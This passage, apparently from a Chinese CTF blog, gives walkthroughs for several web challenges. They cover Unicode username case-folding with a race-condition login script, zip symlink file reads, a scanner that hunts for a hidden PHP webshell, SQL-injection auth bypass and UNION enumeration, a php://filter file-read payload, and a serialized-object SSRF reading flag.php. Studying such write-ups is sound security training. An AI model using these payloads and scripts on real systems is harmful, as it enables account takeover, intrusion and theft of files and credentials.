class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/register', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        **name = strlower(form.username.data)**</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">'image'</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">'Wrong verify code.'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">'The username has been registered'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'register successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title = <span class="string">'register'</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        **name = strlower(form.username.data)**</span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">'Invalid username or password'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, title = <span class="string">'login'</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        **name = strlower(session[<span class="string">'name'</span>])**</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br></pre></td></tr></table></figure><p>python 已经有了自己的 lower() 函数不用，用了自己定义的 strlower() ，进到这个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>可以看到 <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> 这个函数来自 twisted ,而题目中 <code>Twisted==10.2.0</code> ,版本差距有点大。</p><p>对于一些字符，<a href="https://unicode-table.com/en/search/?q=small+capital" target="_blank" rel="noopener">https://unicode-table.com/en/search/?q=small+capital</a> 这个函数的作用就是</p><pre><code>ᴀ -&gt; A -&gt; a</code></pre><p>我们在上面的网站上找到一个 <code>ā</code> ，然后注册 <code>ādmin</code> ,此时经过一次 <code>strlower()</code> 变为 <code>ADMIN</code> ，之后我们登陆 <code>ADMIN</code> ，再经过一次 <code>strlower()</code> 就成为了 <code>admin</code> 。</p><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>先注册一个用户然后开一个线程改密码，另一个线程使用 admin 登陆，在某一瞬间生成 admin 的session 时我们改密码的操作也到了，这时就可以修改密码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">exp.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'skysec'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    change(s, <span class="string">'skysec'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="hide-and-seak"><a href="#hide-and-seak" class="headerlink" title="hide_and_seak"></a>hide_and_seak</h3><p><strong>zip软连接读取文件</strong></p><p>Linux ln命令是一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接。   当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p><p>Linux文件系统中，有所谓的链接(link)，我们可以将其视为档案的别名，而链接又可分为两种 : 硬链接(hard link)与软链接(symbolic link)，硬链接的意思是一个档案可以有多个名称，而软链接的方式则是产生一个特殊的档案，该档案的内容是指向另一个档案的位置。硬链接是存在同一个文件系统中，而软链接却可以跨越不同的文件系统。</p><p>软链接：</p><pre><code>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式2.软链接可以 跨文件系统 ，硬链接不可以3.软链接可以对一个不存在的文件名进行链接4.软链接可以对目录进行链接</code></pre><p>硬链接：</p><pre><code>1.硬链接，以文件副本的形式存在。但不占用实际空间。2.不允许给目录创建硬链接3.硬链接只有在同一个文件系统中才能创建</code></pre><p>我们尝试生成一个软连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/tmp# ln -s test.txt test</span><br><span class="line">  ll</span><br><span class="line">lrwxrwxrwx  1 root  root 8 11月  7 17:41 test -&gt; test.txt</span><br><span class="line">-rw-r--r--  1 root  root12 11月  7 17:41 test.txt</span><br><span class="line"></span><br><span class="line">/tmp# cat test</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line">/tmp# cat test.txt</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>尝试读取文件内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php -r "echo file_get_contents('test.txt');"</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line">php -r "echo file_get_contents('test');"</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>然后我们尝试进行压缩 –symlinks 即生成软连接</p><pre><code>zip --symlinks test.zip test</code></pre><h3 id="强网杯-高明的黑客"><a href="#强网杯-高明的黑客" class="headerlink" title="强网杯-高明的黑客"></a>强网杯-高明的黑客</h3><p>打开之后提示我们下载源码，下载完发现是一个有 3002 个php文件的文件夹。</p><p>查看文件内容后发现代码难以阅读，做了很多混淆，但是里面充满了 <code>$_GET &amp; $_POST</code> 以及 <code>eval、exec、assert...</code> 可以看出来这应该藏了一个shell，我们要做的就是把可用的 shell 找出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">target_path = []</span><br><span class="line">path = <span class="string">"F:\CTF-files\BUUCTF\WEB\高明的黑客\www\src"</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> filename <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">    <span class="comment"># print(os.path.join(path, filename))</span></span><br><span class="line">    target_path.append(filename)</span><br><span class="line">    <span class="comment"># count += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(target_path)</span></span><br><span class="line"><span class="comment"># print(count)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="comment"># params = &#123;&#125;</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"F:\CTF-files\BUUCTF\WEB\高明的黑客\www\src\\"</span>+ target, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">        Get = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, text))  <span class="comment"># 得到当前文件内所有的 GET 参数</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        for param in Get:</span></span><br><span class="line"><span class="string">            params[param] = 'echo("2333");'  # 将正则到的所有参数都加上参数</span></span><br><span class="line"><span class="string">        # print(params)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> Get:</span><br><span class="line">            url = <span class="string">"http://127.0.0.1/buu/src/"</span></span><br><span class="line">            new_url = <span class="string">"%s%s?%s=%s"</span> % (url, target_path, i, <span class="string">'echo "2333"'</span>)</span><br><span class="line">            r = requests.get(new_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"2333"</span> <span class="keyword">in</span> r.text:  <span class="comment"># 带参数访问后检查是否有参数输出</span></span><br><span class="line">                print(<span class="string">"++++++++++++++++++++++++++++GET find it! in "</span> + target_path)</span><br><span class="line">                result.append(target_path)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"GET No ! in "</span> + target_path + <span class="string">"\n"</span>)</span><br><span class="line">                print(r.url + <span class="string">"\n"</span>)</span><br><span class="line">            r.close()</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(target_path)</span>:</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"F:\CTF-files\BUUCTF\WEB\高明的黑客\www\src\\"</span> + target_path, <span class="string">"r"</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">        Get = list(re.findall(<span class="string">'\$_GET\[\'(.*?)\'\]'</span>, text))  <span class="comment"># 得到当前文件内所有的 GET 参数</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        for param in Get:</span></span><br><span class="line"><span class="string">            data[param] = 'print_r("2333")'  # 将正则到的所有参数都加上参数</span></span><br><span class="line"><span class="string">        # print(params)</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        url = <span class="string">"http://127.0.0.1/buu/src/"</span></span><br><span class="line">        r = requests.post(url + target_path, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"2333"</span> <span class="keyword">in</span> r.text:  <span class="comment"># 带参数访问后检查是否有参数输出</span></span><br><span class="line">            print(<span class="string">"++++++++++++++++++++++++++++POST find it! in "</span> + target_path)</span><br><span class="line">            result.append(target_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"POST No ! in "</span> + target_path + <span class="string">"\r\n"</span>)</span><br><span class="line">        r.close()</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t1 = datetime.now()</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(processes=<span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target_path:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        results = pool.apply_async(get, i)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'Multiprocess Scanning Completed in  '</span>, datetime.now() - t1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    get(target_path)</span><br><span class="line">    post(target_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>提取完所有的 <code>GET和POST</code> 参数之后放在本地访问，如果我们加的参数成功 <code>echo</code> 了，说明找到可用 shell ，随后 <code>cat /flag</code> 即可。</p><h3 id="EasySQL"><a href="#EasySQL" class="headerlink" title="EasySQL"></a>EasySQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&apos; 123</span><br><span class="line">to use near &apos;123&apos;&apos; at line 1</span><br><span class="line"></span><br><span class="line">1&apos; or 1=1   123</span><br><span class="line">use near &apos; &apos; and password=&apos;123&apos; &apos; at line 1</span><br><span class="line"></span><br><span class="line">1&apos; or 1=1# 123</span><br></pre></td></tr></table></figure><p>登陆就有flag.</p><h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p>查看源码发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="keyword">echo</span> $cat;</span><br><span class="line">        <span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><code>GET</code>传参</p><h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p><strong>F12</strong>打开开发者工具，监视网络，发现在连续的三个页面中间有一个302跳转，我们抓包之后发现跳转页面的注释中给了一个文件名 <code>secr3t.php</code> ,访问得到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>php 伪协议读文件之后再解码即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="网鼎杯-Fakebook"><a href="#网鼎杯-Fakebook" class="headerlink" title="网鼎杯-Fakebook"></a>网鼎杯-Fakebook</h3><p>扫目录得到 robots.txt </p><p><code>/user.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看起来像 SSRF ，又有序列化。</p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p><code>Join</code> 页面 <code>sqlmap</code> 试出来 <code>username</code> 有 POST 注入，存的数据是序列化之后的用户信息。</p><p>注册登录之后查看 BLOG 内容页面发现 <code>no</code> 参数可能存在注入：</p><p><code>http://buuoj.cn/view.php?no=1 and 1=1#</code></p><p><code>正常</code></p><p><code>node3.buuoj.cn/view.php?no=1 and 1=2#</code></p><p><code>报错 Notice: Trying to get property of non-object in /var/www/html/view.php on line 53</code></p><p><code>node3.buuoj.cn/view.php?no=1 order by 5#</code></p><p><code>*] query error! (Unknown column &#39;5&#39; in &#39;order clause&#39;)</code></p><p><code>node3.buuoj.cn/view.php?no=-1 union select 1,2,3,4#</code></p><p><code>有过滤：no hack ~_~</code></p><p><code>.node3.buuoj.cn/view.php?no=-1 union/**/select 1,2,3,4#</code></p><p><code>找到回显位在 2</code></p><p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(schema_name),3,4 from information_schema.schemata--+</code></p><p><code>fakebook,information_schema,mysql,performance_schema,test</code></p><p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&#39;fakebook&#39;--+</code></p><p><code>users</code></p><p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;--+</code></p><p><code>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</code></p><p><code>node3.buuoj.cn/view.php?no=-1++union++select 1,group_concat(data,username,passwd),3,4 from users--+</code></p><p><code>O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;goya&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:20:&quot;http://www.baidu.com&quot;;}goyaed12c3322e527f073f9159f257dfcc7db08c86ec11388c76b6c5009b06aa33ecd6bfab7d74151ba3f0c50ef1938c03134762c9e435cc88db39c53114ed2a2b14</code></p><p>序列化存储 <code>data</code></p><p>结合上面的代码我们可以知道下面的代码即可读取 flag ：</p><p><code>?no=0 union/**/select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:19;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}&#39;</code></p><p>顺便读一下 <code>view.php</code></p><figure class="highlight 